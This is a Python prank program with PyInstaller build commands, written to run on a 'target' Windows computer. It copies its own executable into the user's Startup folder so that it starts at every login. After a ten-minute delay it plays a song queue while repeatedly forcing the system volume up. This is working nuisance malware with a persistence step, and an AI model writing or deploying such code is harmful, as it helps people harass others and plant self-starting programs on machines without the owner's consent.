
from sound import Sound
import time
import sys
import os

os.environ['PYGAME_HIDE_SUPPORT_PROMPT'] = "hide"
from pygame import mixer
'''
pyinstaller -F --add-data unstoppable.mp3;. --add-data WeCanGetHigh.mp3;. --add-data snake.mp3;. -i icon.ico main.py 
pyinstaller -F -w --add-data unstoppable.mp3;. --add-data snake.mp3;. --add-data WeCanGetHigh.mp3;. -i icon.ico main.py 
#(MAX EVIL)
'''
EvilMode = True


songList=[]
if EvilMode:
    songList=["snake.mp3","unstoppable.mp3","WeCanGetHigh.mp3","WeCanGetHigh.mp3"]
else:
    songList = ["WeCanGetHigh.mp3", "unstoppable.mp3", "snake.mp3","WeCanGetHigh.mp3"]
counter = 0  # increaseing volume counter
mixer.init()

print("Welcome " + os.getlogin() + " to the less asshole version of the prank LOL XD\n\
\t*If you want to exit the program hit the X on top right corner\n\
    \tor\n\
\t*terminate the program by going into task manager, select this program ,and hit \"end task\"\n\n\
Songs Queue list: " + str(songList))
print("\n\n")

# print(
#     "Location of startup Directory: C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(
#         os.getlogin()))
# print(sys.executable) # Location of the EXE file


# Saves the program to startup directory of current user
os.system("xcopy \"{}\" \"{}\" /Y".format(sys.executable,
                                       "C:\\Users\\" + os.getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"))

# Delete itslef doesnt work cuz dont have system permission
# os.system("del \"{}\"".format(sys.executable))


def resource_path(relative_path):
    # Get absolute path to resource, works for dev and for PyInstaller
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)
    # theme Decal functions here {


def increaseVolume():
    global counter
    counter += 1
    print("\rIncreased Volume :" + str(counter) + " Times", end="\r")
    for i in range(50):
        Sound.volume_up()


# Timer before start
waitTime = 60*10  # 3 minutes
time.sleep(waitTime / 2)
print("Half way there:" + str(waitTime / 2) + " more seconds")
time.sleep(waitTime / 2)
i=0
while i < len(songList):
    if not mixer.music.get_busy():
        counter = 0
        mixer.music.load(resource_path(songList[i]))
        mixer.music.play()
        print("\nPlaying :" + songList[i])
        i+=1
    else:
        increaseVolume()
        # cant be lower then .3 or it lags the target computer
        time.sleep(.35)
